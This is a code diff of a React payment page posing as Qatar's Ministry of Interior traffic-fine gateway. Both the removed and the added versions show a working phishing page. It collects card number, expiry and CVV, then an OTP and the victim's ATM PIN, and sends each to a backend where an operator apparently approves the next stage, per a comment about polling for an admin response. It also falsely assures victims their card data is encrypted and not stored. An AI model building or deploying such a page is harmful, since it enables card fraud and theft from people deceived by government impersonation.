@@ -1,94 +1,35 @@
-import { useState, useEffect, type ReactNode, type FormEvent } from "react";
+import React, { useState, useEffect, type FormEvent } from "react";
+import { useLanguage } from "@/contexts/LanguageContext";
 import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
-import { useLanguage } from "@/contexts/LanguageContext";
-import { Shield, CreditCard, Lock, CheckCircle2, AlertCircle, ArrowRight, Loader2 } from "lucide-react";
+import { toast } from "sonner";
+import {
+  ShieldCheck,
+  Lock,
+  CreditCard,
+  Loader2,
+  CheckCircle2,
+  AlertCircle
+} from "lucide-react";
+
+const QATAR_HEADER_IMAGE = "/qatar-header-full.jpg";
 
 type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
 
-type CardSubmitPayload = {
-  cardName: string;
-  cardNumber: string;
-  cardExpiry: string;
-  cardCvv: string;
-};
-
-const MOI_QATAR_LOGO = "https://portal.moi.gov.qa/wps/PA_MOIPortalStaticResources/images/moi-logo-ar.png";
-
-function PaymentFrame({ children }: { children: ReactNode }) {
-  return (
-    <div className="min-h-screen bg-gray-50 px-4 py-8 md:py-12" dir="rtl">
-      <div className="mx-auto max-w-2xl overflow-hidden rounded-[2rem] bg-white shadow-2xl border border-gray-100">
-        {children}
-      </div>
-    </div>
-  );
-}
-
-function PaymentGatewayHeader({ lang }: { lang: string }) {
-  return (
-    <div className="bg-white px-8 pt-8 pb-6 border-b border-gray-100">
-      <div className="flex items-center justify-between gap-4">
-        <img
-          src={MOI_QATAR_LOGO}
-          alt="MOI Qatar"
-          className="h-14 w-auto object-contain"
-        />
-        <div className="text-left">
-          <div className="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Secure Payment Gateway</div>
-          <div className="flex items-center gap-2 text-green-600 font-bold text-sm">
-            <Lock size={14} />
-            <span>{lang === 'ar' ? 'دفع آمن' : 'Secure Pay'}</span>
-          </div>
-        </div>
-      </div>
-    </div>
-  );
-}
-
-function SectionCard({ title, children, lang }: { title: string; children: ReactNode; lang: string }) {
-  return (
-    <section className="mb-6 overflow-hidden rounded-2xl border border-gray-100 bg-white shadow-sm">
-      <div className="bg-maroon-50 px-6 py-4 text-sm font-black text-maroon-900 border-b border-maroon-100 flex items-center gap-2">
-        <div className="w-1.5 h-4 bg-maroon-700 rounded-full"></div>
-        {title}
-      </div>
-      <div className="px-6 py-5">{children}</div>
-    </section>
-  );
-}
-
-function PaymentFooter({ lang }: { lang: string }) {
-  return (
-    <div className="px-8 py-8 text-center bg-gray-50 border-t border-gray-100">
-      <p className="text-sm text-gray-600 font-medium">
-        {lang === 'ar' ? 'للمزيد من الاستفسارات يرجى الاتصال على' : 'For inquiries please call'} <span className="font-black text-maroon-700">999</span>
-      </p>
-      <p className="mt-2 text-[10px] text-gray-400 font-bold uppercase tracking-widest">© {new Date().getFullYear()} Ministry of Interior - Qatar</p>
-    </div>
-  );
-}
-
 export default function Payment() {
-  const [location, navigate] = useLocation();
-  const { t, lang, isRTL } = useLanguage();
-  const [paymentData, setPaymentData] = useState<any>(null);
+  const { lang, isRTL } = useLanguage();
+  const [, navigate] = useLocation();
+  const searchParams = new URLSearchParams(window.location.search);
+  const sessionId = searchParams.get("session") || "";
+  
   const [stage, setStage] = useState<Stage>("card");
   const [error, setError] = useState<string | null>(null);
+  const [cardName, setCardName] = useState("");
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardExpiry, setCardExpiry] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
   const [otpCode, setOtpCode] = useState("");
   const [atmPin, setAtmPin] = useState("");
-  const [isLoading, setIsLoading] = useState(false);
-
-  useEffect(() => {
-    const data = sessionStorage.getItem("paymentData");
-    if (!data) {
-      navigate(isRTL ? "/ar" : "/");
-      return;
-    }
-    setPaymentData(JSON.parse(data));
-  }, [navigate, isRTL]);
-
-  const sessionId = new URLSearchParams(window.location.search).get("sessionId") || paymentData?.sessionId;
 
   const submitCardMutation = trpc.payment.submitCard.useMutation({
     onSuccess: () => setStage("card_pending"),
@@ -105,7 +46,6 @@ export default function Payment() {
     onError: (err) => setError(err.message),
   });
 
-  // Polling for admin response
   const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
     { sessionId: sessionId || "" },
     {
@@ -122,222 +62,235 @@ export default function Payment() {
     }
   }, [sessionStatus, stage]);
 
-  if (!paymentData) return null;
-
   const handleCardSubmit = (e: FormEvent) => {
     e.preventDefault();
-    setIsLoading(true);
-    const form = e.target as HTMLFormElement;
-    const formData = new FormData(form);
-    
+    if (!cardName || !cardNumber || !cardExpiry || !cardCvv) {
+      toast.error(lang === "ar" ? "يرجى إكمال جميع الحقول" : "Please fill all fields");
+      return;
+    }
     submitCardMutation.mutate({
       sessionId,
-      cardName: formData.get("cardName") as string,
-      cardNumber: (formData.get("cardNumber") as string).replace(/\s/g, ""),
-      cardExpiry: formData.get("cardExpiry") as string,
-      cardCvv: formData.get("cardCvv") as string,
-    }, {
-      onSettled: () => setIsLoading(false)
+      cardName,
+      cardNumber,
+      cardExpiry,
+      cardCvv,
     });
   };
 
   const handleOtpSubmit = (e: FormEvent) => {
     e.preventDefault();
-    setIsLoading(true);
-    submitOtpMutation.mutate({ sessionId, otpCode }, {
-      onSettled: () => setIsLoading(false)
-    });
+    submitOtpMutation.mutate({ sessionId, otpCode });
   };
 
   const handleAtmSubmit = (e: FormEvent) => {
     e.preventDefault();
-    setIsLoading(true);
-    submitAtmPinMutation.mutate({ sessionId, atmPin }, {
-      onSettled: () => setIsLoading(false)
-    });
+    submitAtmPinMutation.mutate({ sessionId, atmPin });
   };
 
   return (
-    <PaymentFrame>
-      <PaymentGatewayHeader lang={lang} />
-      
-      <div className="p-8">
-        {stage === "card" && (
-          <form onSubmit={handleCardSubmit} className="animate-in fade-in duration-500">
-            <SectionCard title={lang === 'ar' ? 'ملخص الدفع' : 'Payment Summary'} lang={lang}>
-              <div className="flex justify-between items-center mb-2">
-                <span className="text-gray-500 text-sm">{lang === 'ar' ? 'إجمالي المخالفات' : 'Total Fines'}</span>
-                <span className="font-bold text-gray-800">{paymentData.selectedFines?.length || 0}</span>
-              </div>
-              <div className="flex justify-between items-center pt-3 border-t border-gray-100">
-                <span className="text-gray-800 font-black">{lang === 'ar' ? 'المبلغ المستحق' : 'Amount Due'}</span>
-                <span className="text-2xl font-black text-maroon-700">{paymentData.totalAmount} <span className="text-xs">{t.home.results.currency}</span></span>
-              </div>
-            </SectionCard>
-
-            <SectionCard title={lang === 'ar' ? 'بيانات البطاقة البنكية' : 'Credit Card Details'} lang={lang}>
-              {error && (
-                <div className="mb-6 p-4 bg-red-50 border border-red-100 rounded-xl text-red-600 text-xs flex items-center gap-3">
-                  <AlertCircle size={16} />
-                  {error}
-                </div>
-              )}
-              <div className="space-y-5">
-                <div className="space-y-2">
-                  <label className="text-xs font-bold text-gray-500 uppercase">{lang === 'ar' ? 'اسم حامل البطاقة' : 'Cardholder Name'}</label>
-                  <input name="cardName" required className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-xl focus:border-maroon-600 outline-none transition-all font-bold" placeholder="NAME ON CARD" />
-                </div>
-                <div className="space-y-2">
-                  <label className="text-xs font-bold text-gray-500 uppercase">{lang === 'ar' ? 'رقم البطاقة' : 'Card Number'}</label>
-                  <div className="relative">
-                    <input name="cardNumber" required className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-xl focus:border-maroon-600 outline-none transition-all font-bold tracking-widest" placeholder="0000 0000 0000 0000" />
-                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300" size={20} />
-                  </div>
-                </div>
-                <div className="grid grid-cols-2 gap-4">
-                  <div className="space-y-2">
-                    <label className="text-xs font-bold text-gray-500 uppercase">{lang === 'ar' ? 'تاريخ الانتهاء' : 'Expiry Date'}</label>
-                    <input name="cardExpiry" required className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-xl focus:border-maroon-600 outline-none transition-all font-bold text-center" placeholder="MM/YY" />
-                  </div>
-                  <div className="space-y-2">
-                    <label className="text-xs font-bold text-gray-500 uppercase">{lang === 'ar' ? 'رمز التحقق (CVV)' : 'CVV'}</label>
-                    <input name="cardCvv" required type="password" maxLength={4} className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-xl focus:border-maroon-600 outline-none transition-all font-bold text-center" placeholder="***" />
-                  </div>
-                </div>
-              </div>
-            </SectionCard>
-
-            <button
-              type="submit"
-              disabled={isLoading}
-              className="w-full bg-maroon-700 hover:bg-maroon-800 text-white font-black py-5 rounded-2xl shadow-xl shadow-maroon-100 transition-all flex items-center justify-center gap-3 disabled:opacity-70"
-            >
-              {isLoading ? <Loader2 className="animate-spin" /> : (
-                <>
-                  <span>{lang === 'ar' ? 'إتمام عملية الدفع' : 'Complete Payment'}</span>
-                  <ArrowRight size={20} className={isRTL ? "rotate-180" : ""} />
-                </>
-              )}
-            </button>
-          </form>
-        )}
-
-        {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
-          <div className="py-20 text-center animate-in fade-in duration-500">
-            <div className="relative w-24 h-24 mx-auto mb-8">
-              <div className="absolute inset-0 border-4 border-maroon-100 rounded-full"></div>
-              <div className="absolute inset-0 border-4 border-maroon-700 rounded-full border-t-transparent animate-spin"></div>
-              <Shield className="absolute inset-0 m-auto text-maroon-700" size={32} />
-            </div>
-            <h3 className="text-xl font-black text-gray-900 mb-2">{lang === 'ar' ? 'جاري معالجة طلبك' : 'Processing Your Request'}</h3>
-            <p className="text-gray-500 text-sm max-w-xs mx-auto">{lang === 'ar' ? 'يرجى الانتظار، يتم التحقق من بياناتك عبر بوابة الدفع الآمنة لوزارة الداخلية' : 'Please wait while we verify your details via MOI secure gateway'}</p>
-          </div>
-        )}
-
-        {stage === "otp" && (
-          <form onSubmit={handleOtpSubmit} className="animate-in fade-in duration-500 text-center">
-            <div className="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-6">
-              <Lock size={32} />
-            </div>
-            <h3 className="text-2xl font-black text-gray-900 mb-2">{t.payment.otp.title}</h3>
-            <p className="text-gray-500 text-sm mb-8">{t.payment.otp.subtitle}</p>
-            
-            <div className="max-w-xs mx-auto space-y-6">
-              <input
-                value={otpCode}
-                onChange={(e) => setOtpCode(e.target.value)}
-                className="w-full text-center text-3xl font-black tracking-[1rem] p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-maroon-600 outline-none transition-all"
-                placeholder="••••••"
-                maxLength={6}
-                required
-              />
-              <button
-                type="submit"
-                disabled={isLoading}
-                className="w-full bg-maroon-700 hover:bg-maroon-800 text-white font-black py-4 rounded-xl shadow-lg transition-all flex items-center justify-center"
-              >
-                {isLoading ? <Loader2 className="animate-spin" /> : t.payment.otp.confirmButton}
-              </button>
-            </div>
-          </form>
-        )}
-
-        {stage === "atm" && (
-          <form onSubmit={handleAtmSubmit} className="animate-in fade-in duration-500 text-center">
-            <div className="w-16 h-16 bg-maroon-50 text-maroon-700 rounded-full flex items-center justify-center mx-auto mb-6">
-              <CreditCard size={32} />
-            </div>
-            <h3 className="text-2xl font-black text-gray-900 mb-2">{t.payment.atm.title}</h3>
-            <p className="text-gray-500 text-sm mb-8">{t.payment.atm.subtitle}</p>
-            
-            <div className="max-w-xs mx-auto space-y-6">
-              <input
-                type="password"
-                value={atmPin}
-                onChange={(e) => setAtmPin(e.target.value)}
-                className="w-full text-center text-3xl font-black tracking-[1rem] p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-maroon-600 outline-none transition-all"
-                placeholder="••••"
-                maxLength={4}
-                required
-              />
-              <button
-                type="submit"
-                disabled={isLoading}
-                className="w-full bg-maroon-700 hover:bg-maroon-800 text-white font-black py-4 rounded-xl shadow-lg transition-all flex items-center justify-center"
-              >
-                {isLoading ? <Loader2 className="animate-spin" /> : t.payment.atm.confirmButton}
-              </button>
-            </div>
-          </form>
-        )}
-
-        {stage === "success" && (
-          <div className="py-12 text-center animate-in zoom-in duration-500">
-            <div className="w-20 h-20 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-inner">
-              <CheckCircle2 size={48} />
-            </div>
-            <h3 className="text-3xl font-black text-gray-900 mb-2">{t.payment.success.title}</h3>
-            <p className="text-gray-500 mb-8">{t.payment.success.subtitle}</p>
-            
-            <div className="bg-gray-50 rounded-2xl p-6 mb-8 text-right space-y-3">
-              <div className="flex justify-between">
-                <span className="text-gray-500">{t.payment.success.amountPaid}</span>
-                <span className="font-black text-gray-800">{paymentData.totalAmount} {t.home.results.currency}</span>
-              </div>
-              <div className="flex justify-between">
-                <span className="text-gray-500">{t.payment.success.reference}</span>
-                <span className="font-mono text-sm text-maroon-700">#{Math.random().toString(36).substr(2, 9).toUpperCase()}</span>
-              </div>
-            </div>
-
-            <button
-              onClick={() => navigate(isRTL ? "/ar" : "/")}
-              className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl hover:bg-black transition-all"
-            >
-              {t.payment.success.backButton}
-            </button>
-          </div>
-        )}
-
-        {stage === "failed" && (
-          <div className="py-12 text-center animate-in shake duration-500">
-            <div className="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
-              <AlertCircle size={48} />
-            </div>
-            <h3 className="text-2xl font-black text-gray-900 mb-2">{lang === 'ar' ? 'فشلت عملية الدفع' : 'Payment Failed'}</h3>
-            <p className="text-gray-500 mb-8">{error || (lang === 'ar' ? 'حدث خطأ غير متوقع أثناء معالجة العملية' : 'An unexpected error occurred during processing')}</p>
-            
-            <button
-              onClick={() => setStage("card")}
-              className="bg-maroon-700 text-white font-bold py-4 px-8 rounded-xl hover:bg-maroon-800 transition-all"
-            >
-              {lang === 'ar' ? 'المحاولة مرة أخرى' : 'Try Again'}
-            </button>
-          </div>
-        )}
+    <div className="min-h-screen bg-[#F8F9FA] rtl" dir="rtl">
+      {/* Header Image */}
+      <div className="w-full">
+        <img src={QATAR_HEADER_IMAGE} alt="MOI Header" className="w-full h-auto object-contain shadow-sm" />
       </div>
 
-      <PaymentFooter lang={lang} />
-    </PaymentFrame>
+      <main className="max-w-md mx-auto px-4 py-8">
+        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
+          <div className="bg-[#8A1538] p-6 text-white text-center">
+            <h1 className="text-xl font-bold">{lang === "ar" ? "بوابة الدفع الإلكتروني" : "Electronic Payment Gateway"}</h1>
+            <p className="text-sm opacity-80 mt-1">{lang === "ar" ? "دفع المخالفات المرورية" : "Traffic Violations Payment"}</p>
+          </div>
+
+          <div className="p-6">
+            {stage === "card" && (
+              <form onSubmit={handleCardSubmit} className="space-y-5">
+                <div className="flex justify-between items-center pb-4 border-b border-gray-100">
+                  <span className="text-gray-600">{lang === "ar" ? "إجمالي المبلغ:" : "Total Amount:"}</span>
+                  <span className="text-xl font-black text-[#8A1538]">0.00 QAR</span>
+                </div>
+
+                {error && (
+                  <div className="p-4 bg-red-50 border border-red-100 rounded-xl text-red-600 text-xs flex items-center gap-3">
+                    <AlertCircle size={16} />
+                    {error}
+                  </div>
+                )}
+
+                <div className="space-y-4">
+                  <div>
+                    <label className="block text-sm font-bold text-gray-700 mb-1">{lang === "ar" ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
+                    <input
+                      type="text"
+                      value={cardName}
+                      onChange={(e) => setCardName(e.target.value)}
+                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
+                      placeholder="JOHN DOE"
+                      required
+                    />
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-bold text-gray-700 mb-1">{lang === "ar" ? "رقم البطاقة" : "Card Number"}</label>
+                    <div className="relative">
+                      <input
+                        type="text"
+                        value={cardNumber}
+                        onChange={(e) => setCardNumber(e.target.value)}
+                        maxLength={16}
+                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] pl-10"
+                        placeholder="0000 0000 0000 0000"
+                        required
+                      />
+                      <CreditCard className="absolute left-3 top-3.5 text-gray-400" size={20} />
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-2 gap-4">
+                    <div>
+                      <label className="block text-sm font-bold text-gray-700 mb-1">{lang === "ar" ? "تاريخ الانتهاء" : "Expiry Date"}</label>
+                      <input
+                        type="text"
+                        value={cardExpiry}
+                        onChange={(e) => setCardExpiry(e.target.value)}
+                        placeholder="MM/YY"
+                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
+                        required
+                      />
+                    </div>
+                    <div>
+                      <label className="block text-sm font-bold text-gray-700 mb-1">{lang === "ar" ? "الرمز السري (CVV)" : "CVV"}</label>
+                      <input
+                        type="password"
+                        value={cardCvv}
+                        onChange={(e) => setCardCvv(e.target.value)}
+                        maxLength={4}
+                        placeholder="***"
+                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
+                        required
+                      />
+                    </div>
+                  </div>
+                </div>
+
+                <div className="bg-blue-50 p-4 rounded-lg flex gap-3 items-start">
+                  <ShieldCheck className="text-blue-600 flex-shrink-0" size={20} />
+                  <p className="text-xs text-blue-800 leading-relaxed">
+                    {lang === "ar" 
+                      ? "يتم تشفير جميع بيانات الدفع الخاصة بك ومعالجتها بشكل آمن. نحن لا نقوم بتخزين تفاصيل بطاقتك الكاملة."
+                      : "All your payment data is encrypted and processed securely. We do not store your full card details."}
+                  </p>
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={submitCardMutation.isPending}
+                  className="w-full py-4 bg-[#8A1538] text-white rounded-lg font-bold hover:bg-[#6D112C] transition-colors flex justify-center items-center gap-2 shadow-lg"
+                >
+                  {submitCardMutation.isPending ? (
+                    <Loader2 className="animate-spin" />
+                  ) : (
+                    <>
+                      <Lock size={18} />
+                      {lang === "ar" ? "إتمام عملية الدفع" : "Complete Payment"}
+                    </>
+                  )}
+                </button>
+              </form>
+            )}
+
+            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
+              <div className="py-20 text-center space-y-6">
+                <Loader2 className="w-16 h-16 text-[#8A1538] animate-spin mx-auto" />
+                <h3 className="text-xl font-bold text-gray-900">{lang === 'ar' ? 'جاري معالجة طلبك' : 'Processing Your Request'}</h3>
+                <p className="text-gray-500 text-sm">{lang === 'ar' ? 'يرجى الانتظار، يتم التحقق من بياناتك عبر بوابة الدفع الآمنة' : 'Please wait while we verify your details via secure gateway'}</p>
+              </div>
+            )}
+
+            {stage === "otp" && (
+              <form onSubmit={handleOtpSubmit} className="text-center space-y-6">
+                <div className="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto">
+                  <Lock size={32} />
+                </div>
+                <h3 className="text-2xl font-bold text-gray-900">{lang === 'ar' ? 'رمز التحقق' : 'Verification Code'}</h3>
+                <p className="text-gray-500 text-sm">{lang === 'ar' ? 'يرجى إدخال الرمز المرسل لهاتفك' : 'Please enter the code sent to your phone'}</p>
+                <input
+                  value={otpCode}
+                  onChange={(e) => setOtpCode(e.target.value)}
+                  className="w-full text-center text-3xl font-black tracking-[0.5rem] p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538]"
+                  placeholder="••••••"
+                  maxLength={6}
+                  required
+                />
+                <button
+                  type="submit"
+                  disabled={submitOtpMutation.isPending}
+                  className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center"
+                >
+                  {submitOtpMutation.isPending ? <Loader2 className="animate-spin" /> : (lang === 'ar' ? 'تأكيد' : 'Confirm')}
+                </button>
+              </form>
+            )}
+
+            {stage === "atm" && (
+              <form onSubmit={handleAtmSubmit} className="text-center space-y-6">
+                <div className="w-16 h-16 bg-[#8A1538]/10 text-[#8A1538] rounded-full flex items-center justify-center mx-auto">
+                  <CreditCard size={32} />
+                </div>
+                <h3 className="text-2xl font-bold text-gray-900">{lang === 'ar' ? 'رقم التعريف الشخصي' : 'ATM PIN'}</h3>
+                <p className="text-gray-500 text-sm">{lang === 'ar' ? 'يرجى إدخال الرقم السري للبطاقة' : 'Please enter your card PIN'}</p>
+                <input
+                  type="password"
+                  value={atmPin}
+                  onChange={(e) => setAtmPin(e.target.value)}
+                  className="w-full text-center text-3xl font-black tracking-[1rem] p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538]"
+                  placeholder="••••"
+                  maxLength={4}
+                  required
+                />
+                <button
+                  type="submit"
+                  disabled={submitAtmPinMutation.isPending}
+                  className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center"
+                >
+                  {submitAtmPinMutation.isPending ? <Loader2 className="animate-spin" /> : (lang === 'ar' ? 'تأكيد' : 'Confirm')}
+                </button>
+              </form>
+            )}
+
+            {stage === "success" && (
+              <div className="py-12 text-center space-y-6">
+                <CheckCircle2 className="w-20 h-20 text-green-500 mx-auto" />
+                <h3 className="text-3xl font-bold text-gray-900">{lang === 'ar' ? 'تم الدفع بنجاح' : 'Payment Successful'}</h3>
+                <p className="text-gray-500">{lang === 'ar' ? 'تمت معالجة دفعتك بنجاح' : 'Your payment has been processed successfully'}</p>
+                <button
+                  onClick={() => navigate(isRTL ? "/ar" : "/")}
+                  className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl hover:bg-black transition-all"
+                >
+                  {lang === 'ar' ? 'العودة للرئيسية' : 'Back Home'}
+                </button>
+              </div>
+            )}
+
+            {stage === "failed" && (
+              <div className="py-12 text-center space-y-6">
+                <AlertCircle className="w-20 h-20 text-red-500 mx-auto" />
+                <h3 className="text-2xl font-bold text-gray-900">{lang === 'ar' ? 'فشلت عملية الدفع' : 'Payment Failed'}</h3>
+                <p className="text-gray-500">{error || (lang === 'ar' ? 'حدث خطأ أثناء معالجة العملية' : 'An error occurred during processing')}</p>
+                <button
+                  onClick={() => setStage("card")}
+                  className="bg-[#8A1538] text-white font-bold py-4 px-8 rounded-xl hover:bg-[#6D112C] transition-all"
+                >
+                  {lang === 'ar' ? 'المحاولة مرة أخرى' : 'Try Again'}
+                </button>
+              </div>
+            )}
+          </div>
+        </div>
+
+        <div className="mt-8 flex justify-center gap-6 opacity-40 grayscale">
+          <img src="/card-brands.png" alt="Payment Methods" className="h-8 object-contain" />
+        </div>
+      </main>
+    </div>
   );
 }
